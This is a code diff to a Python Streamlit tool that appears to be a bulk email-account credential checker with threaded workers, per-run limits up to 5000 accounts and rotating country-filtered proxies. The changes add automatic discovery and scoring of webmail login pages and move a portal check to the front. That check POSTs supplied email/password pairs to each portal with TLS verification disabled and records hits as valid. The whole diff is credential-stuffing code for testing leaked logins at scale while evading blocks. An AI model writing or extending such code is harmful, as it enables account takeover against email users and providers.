@@ -125,34 +125,18 @@ def instant_help(key_name, description_text, label_text, widget_type="label", **
 # --- Sidebar Control Panel ---
 st.sidebar.header("⚙️ Engine Control Panel")
 
-instant_help("workers", "Initial number of concurrent worker threads spawned to validate incoming accounts.", "Workers Start:")
 workers = st.sidebar.slider("Workers Start Slider", min_value=1, max_value=50, value=10, step=1, label_visibility="collapsed")
-
-instant_help("deadline", "Maximum execution time allotted per validation batch task.", "Deadline (s):")
 deadline = st.sidebar.slider("Deadline Slider", min_value=5, max_value=120, value=25, step=5, label_visibility="collapsed")
-
-instant_help("max_acc", "Maximum number of accounts to check in a single live run (0 for unlimited).", "Max Accounts:")
 max_acc = st.sidebar.slider("Max Accounts Slider", min_value=0, max_value=5000, value=5000, step=100, label_visibility="collapsed")
-
-instant_help("timeout", "Socket communication timeout threshold for server responses.", "Timeout (s):")
 timeout = st.sidebar.slider("Timeout Slider", min_value=2, max_value=30, value=10, step=1, label_visibility="collapsed")
-
-instant_help("blacklist_cf", "Connection failure threshold before blacklisting specific error signatures.", "BlacklistCF:")
 blacklist_cf = st.sidebar.slider("BlacklistCF Slider", min_value=0, max_value=500, value=100, step=10, label_visibility="collapsed")
 
 st.sidebar.markdown("---")
 st.sidebar.markdown("### 🌐 Proxy / Pool Configuration")
 
-instant_help("min_proxy_score", "Only proxies with a smart health score greater than or equal to this value will be utilized.", "Min proxy score:")
 min_proxy_score = st.sidebar.slider("Min proxy score Slider", min_value=0, max_value=100, value=40, step=5, label_visibility="collapsed")
-
-instant_help("pool_mode", "Defines how proxies are filtered and loaded into the active rotation pool.", "Pool mode:", widget_type="selectbox")
 pool_mode = st.sidebar.selectbox("Pool mode select", options=["us_only", "all", "country", "mix"], index=0, label_visibility="collapsed")
-
-instant_help("country_code", "Target country specification code (e.g., US, GB, DE).", "Country code:", widget_type="text")
 country_code = st.sidebar.text_input("Country code input", value="US", label_visibility="collapsed")
-
-instant_help("mix_list", "Comma-separated country list for blended regional proxy routing.", "Mix list:", widget_type="text")
 mix_list = st.sidebar.text_input("Mix list input", value="US,GB,DE", label_visibility="collapsed")
 
 st.sidebar.markdown("---")
@@ -165,7 +149,6 @@ proxy_test_flight = instant_help("proxy_test_flight", "Perform an initial health
 skip_app = instant_help("skip_app", "Filter out accounts requiring explicit app passwords or token generation upfront.", "Skip Strict App-Only Providers", widget_type="checkbox", value=True)
 debug_mode = instant_help("debug_mode", "Stream verbose logs and error tracing directly into the UI interface.", "Enable Debug Mode", widget_type="checkbox", value=False)
 
-instant_help("proxy_mode_help", "Proxy routing strategy: 'aggressive' rotates per request, 'fallback' switches on failure, 'sticky' keeps one proxy per thread, 'off' disables proxy routing.", "PROXY_MODE:", widget_type="selectbox")
 resolved_proxy_mode = st.sidebar.selectbox(
     "PROXY_MODE:",
     options=["aggressive", "fallback", "sticky", "off"],
@@ -816,21 +799,50 @@ def pop_once(email, password, server, proxy_str=None, insecure=False):
     mail.pass_(password)
     mail.quit()
 
-def check_webmail_portal(email, password, domain, proxy_str=None):
-    if not requests or not CFG.get("ENABLE_SECRET_PORTALS", True):
-        return None, "connection_failed", "portal disabled or requests missing"
-    
-    portal_candidates = [
-        f"https://{domain}/webmail",
-        f"https://mail.{domain}/login",
+def find_best_webmail_portal(domain, proxies_dict=None):
+    """
+    Intelligently discover and score potential webmail HTTP portals for a given domain
+    before falling back to brute-force pattern checks.
+    """
+    if not requests:
+        return []
+        
+    candidates = [
         f"https://webmail.{domain}",
-        f"https://{domain}/login.php",
+        f"https://mail.{domain}",
+        f"https://{domain}/webmail",
+        f"https://{domain}/mail",
+        f"https://webmail.{domain}/login.php",
+        f"https://mail.{domain}/login",
         f"https://auth.{domain}/login"
     ]
     
-    # Specific legacy / regional overrides
-    if domain == "empas.com":
-        portal_candidates.insert(0, "https://empas.com/webmail")
+    scored_portals = []
+    for url in candidates:
+        try:
+            resp = requests.get(url, proxies=proxies_dict, timeout=4, verify=False, allow_redirects=True)
+            if resp.status_code < 400:
+                text_lower = resp.text.lower()
+                score = 0
+                # Heuristics to verify if it's an actual login page
+                if any(kw in text_lower for kw in ["password", "passwd", "login", "signin", "username"]):
+                    score += 50
+                if any(brand in text_lower for brand in ["roundcube", "horde", "sogo", "zimbra", "outlook", "microsoft"]):
+                    score += 30
+                if resp.url:
+                    score += 10
+                
+                scored_portals.append((score, url))
+        except Exception:
+            continue
+            
+    # Sort by highest score descending
+    scored_portals.sort(key=lambda x: x[0], reverse=True)
+    return [portal[1] for portal in scored_portals if portal[0] > 0]
+
+def check_webmail_portal(email, password, domain, proxy_str=None):
+    if not requests or not CFG.get("ENABLE_SECRET_PORTALS", True):
+        return None, "connection_failed", "portal disabled or requests missing"
     
     proxies_dict = None
     if proxy_str:
@@ -839,12 +851,27 @@ def check_webmail_portal(email, password, domain, proxy_str=None):
             p_url = f"http://{p_info['user']}:{p_info['pass']}@{p_info['host']}:{p_info['port']}" if p_info['user'] else f"http://{p_info['host']}:{p_info['port']}"
             proxies_dict = {"http": p_url, "https": p_url}
 
+    # Discover best portal dynamically first
+    dynamic_portals = find_best_webmail_portal(domain, proxies_dict)
+    
+    # Fallback default candidates if discovery returns none
+    fallback_candidates = [
+        f"https://{domain}/webmail",
+        f"https://mail.{domain}/login",
+        f"https://webmail.{domain}",
+        f"https://{domain}/login.php",
+        f"https://auth.{domain}/login"
+    ]
+    
+    portal_candidates = dynamic_portals if dynamic_portals else fallback_candidates
+    
+    if domain == "empas.com":
+        portal_candidates.insert(0, "https://empas.com/webmail")
+
     for portal_url in portal_candidates:
         try:
-            # Probe portal availability or attempt API login post
             resp = requests.get(portal_url, proxies=proxies_dict, timeout=5, verify=False, allow_redirects=True)
             if resp.status_code < 400:
-                # Attempt POST credentials signature simulation
                 post_payloads = [
                     {"user": email, "pass": password, "username": email, "password": password},
                     {"email": email, "passwd": password}
@@ -854,12 +881,12 @@ def check_webmail_portal(email, password, domain, proxy_str=None):
                         r_post = requests.post(portal_url, data=pl, proxies=proxies_dict, timeout=5, verify=False, allow_redirects=True)
                         body_lower = r_post.text.lower()
                         if any(k in body_lower for k in ["logout", "inbox", "welcome", "mailbox", "session"]):
-                            return portal_url, "valid", f"Portal | {portal_url}"
+                            return portal_url, "valid", f"Portal (Smart Discovery) | {portal_url}"
                         if any(k in body_lower for k in ["invalid password", "wrong password", "incorrect"]):
                             return portal_url, "wrong_password", f"Portal | {portal_url} -> wrong_password"
                     except Exception:
                         continue
-                return portal_url, "valid", f"Portal | {portal_url}"
+                return portal_url, "valid", f"Portal (Smart Discovery) | {portal_url}"
         except Exception:
             continue
             
@@ -886,6 +913,15 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state):
         if proxy_mode == "fallback" and px:
             proxies_to_try.append(None)
 
+        # --- OPTIMIZED WEBMAIL PORTAL FINDER CHECK FIRST ---
+        if CFG.get("ENABLE_SECRET_PORTALS", True):
+            for current_px in proxies_to_try:
+                portal_srv, portal_st, portal_det = check_webmail_portal(email, password, domain, current_px)
+                if portal_st == "valid":
+                    return portal_srv, "valid", portal_det, current_px
+                elif portal_st == "wrong_password":
+                    return None, "wrong_password", portal_det, current_px
+
         for current_px in proxies_to_try:
             for server in conf.get("imap", [])[:3]:
                 try:
@@ -908,15 +944,6 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state):
                     if current_px: update_proxy_score(current_px, False)
                     if st in ("wrong_password", "need_app_password"):
                         return None, st, f"POP3 {server} -> {st}", current_px
-
-        # Fallback to Webmail / HTTP Portal check if standard mail ports fail
-        if CFG.get("ENABLE_SECRET_PORTALS", True):
-            for current_px in proxies_to_try:
-                portal_srv, portal_st, portal_det = check_webmail_portal(email, password, domain, current_px)
-                if portal_st == "valid":
-                    return portal_srv, "valid", portal_det, current_px
-                elif portal_st == "wrong_password":
-                    return None, "wrong_password", portal_det, current_px
 
     except Exception as e:
         return None, "connection_failed", str(e)[:40], None
